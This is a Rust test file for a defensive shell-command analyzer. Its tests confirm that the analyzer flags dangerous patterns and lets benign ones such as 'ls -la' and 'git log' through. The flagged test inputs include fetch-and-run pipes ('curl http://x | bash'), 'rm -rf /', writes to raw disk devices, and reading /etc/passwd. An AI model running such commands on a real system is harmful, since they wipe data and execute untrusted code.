use super::*;

#[test]
fn test_interpreter_inline_exec() {
    let violations = analyze_command("python3 -c 'import os'");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::InterpreterInlineExec),
        "should detect python3 -c as inline exec"
    );
}

#[test]
fn test_perl_inline_exec() {
    let violations = analyze_command("perl -e 'system(\"bad\")'");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::InterpreterInlineExec),
        "should detect perl -e as inline exec"
    );
}

#[test]
fn test_node_inline_exec() {
    let violations = analyze_command("node -e 'process.exit(1)'");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::InterpreterInlineExec),
        "should detect node -e as inline exec"
    );
}

#[test]
fn test_python_script_not_inline_exec() {
    let violations = analyze_command("python3 script.py -c config.yaml");
    // -c comes after a non-flag word (script.py), so the flag belongs to
    // the script, not the interpreter. This should not be flagged.
    let has_inline = violations
        .iter()
        .any(|v| v.kind == ViolationKind::InterpreterInlineExec);
    assert!(
        !has_inline,
        "python3 script.py -c config.yaml should NOT trigger inline exec (flag belongs to script)"
    );
}

#[test]
fn test_dangerous_pipe_target_bash() {
    let violations = analyze_command("curl http://x | bash");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousPipeTarget),
        "should detect piping into bash"
    );
}

#[test]
fn test_dangerous_pipe_target_sh() {
    let violations = analyze_command("wget -qO- http://x | sh");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousPipeTarget),
        "should detect piping into sh"
    );
}

#[test]
fn test_eval_like() {
    let violations = analyze_command("eval 'rm -rf /'");
    assert!(
        violations.iter().any(|v| v.kind == ViolationKind::EvalLike),
        "should detect eval"
    );
}

#[test]
fn test_source_command() {
    let violations = analyze_command("source /etc/profile");
    assert!(
        violations.iter().any(|v| v.kind == ViolationKind::EvalLike),
        "should detect source"
    );
}

#[test]
fn test_dot_source() {
    let violations = analyze_command(". /etc/profile");
    assert!(
        violations.iter().any(|v| v.kind == ViolationKind::EvalLike),
        "should detect . (dot source)"
    );
}

#[test]
fn test_subshell() {
    let violations = analyze_command("(rm -rf /)");
    assert!(
        violations.iter().any(|v| v.kind == ViolationKind::Subshell),
        "should detect subshell"
    );
}

#[test]
fn test_function_definition() {
    let violations = analyze_command("f() { bad; }");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::FunctionDefinition),
        "should detect function definition"
    );
}

#[test]
fn test_dangerous_redirection() {
    let violations = analyze_command("echo x > /dev/sda");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousRedirection),
        "should detect redirection to /dev/sda"
    );
}

#[test]
fn test_dangerous_redirection_nvme() {
    let violations = analyze_command("cat data > /dev/nvme0n1");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousRedirection),
        "should detect redirection to /dev/nvme0n1"
    );
}

#[test]
fn test_command_substitution_dollar_paren() {
    let violations = analyze_command("echo $(cat /etc/passwd)");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::CommandSubstitution),
        "should detect $() command substitution"
    );
}

#[test]
fn test_command_substitution_backtick() {
    let violations = analyze_command("echo `cat /etc/passwd`");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::CommandSubstitution),
        "should detect backtick command substitution"
    );
}

#[test]
fn test_process_substitution() {
    let violations = analyze_command("diff <(cat a) <(cat b)");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::ProcessSubstitution),
        "should detect process substitution"
    );
}

// --- Clean commands that should NOT trigger violations ---

#[test]
fn test_clean_ls() {
    let violations = analyze_command("ls -la");
    assert!(
        violations.is_empty(),
        "ls -la should be clean: {:?}",
        violations
    );
}

#[test]
fn test_clean_pipe() {
    let violations = analyze_command("cat file | grep foo | sort");
    assert!(
        violations.is_empty(),
        "safe pipe should be clean: {:?}",
        violations
    );
}

#[test]
fn test_clean_git() {
    let violations = analyze_command("git log --oneline");
    assert!(
        violations.is_empty(),
        "git log should be clean: {:?}",
        violations
    );
}

#[test]
fn test_clean_redirect_to_file() {
    let violations = analyze_command("echo hello > /tmp/output.txt");
    assert!(
        violations.is_empty(),
        "redirect to normal file should be clean: {:?}",
        violations
    );
}

#[test]
fn test_clean_cargo() {
    let violations = analyze_command("cargo test --lib");
    assert!(
        violations.is_empty(),
        "cargo test should be clean: {:?}",
        violations
    );
}

#[test]
fn test_unparseable_returns_empty() {
    // Malformed shell that brush-parser can't parse
    let violations = analyze_command("((( unterminated");
    assert!(
        violations.is_empty(),
        "unparseable input should return empty (fall through to regex)"
    );
}

#[test]
fn test_safe_pipe_to_grep() {
    // grep is not in DANGEROUS_PIPE_TARGETS
    let violations = analyze_command("cat file | grep pattern");
    assert!(
        violations.is_empty(),
        "piping to grep should be safe: {:?}",
        violations
    );
}

#[test]
fn test_chain_clean() {
    let violations = analyze_command("mkdir -p dir && cd dir && ls");
    assert!(
        violations.is_empty(),
        "simple chain should be clean: {:?}",
        violations
    );
}

#[test]
fn test_pipe_to_python_is_dangerous() {
    let violations = analyze_command("echo 'import os' | python3");
    assert!(
        violations
            .iter()
            .any(|v| v.kind == ViolationKind::DangerousPipeTarget),
        "piping into python3 should be dangerous"
    );
}
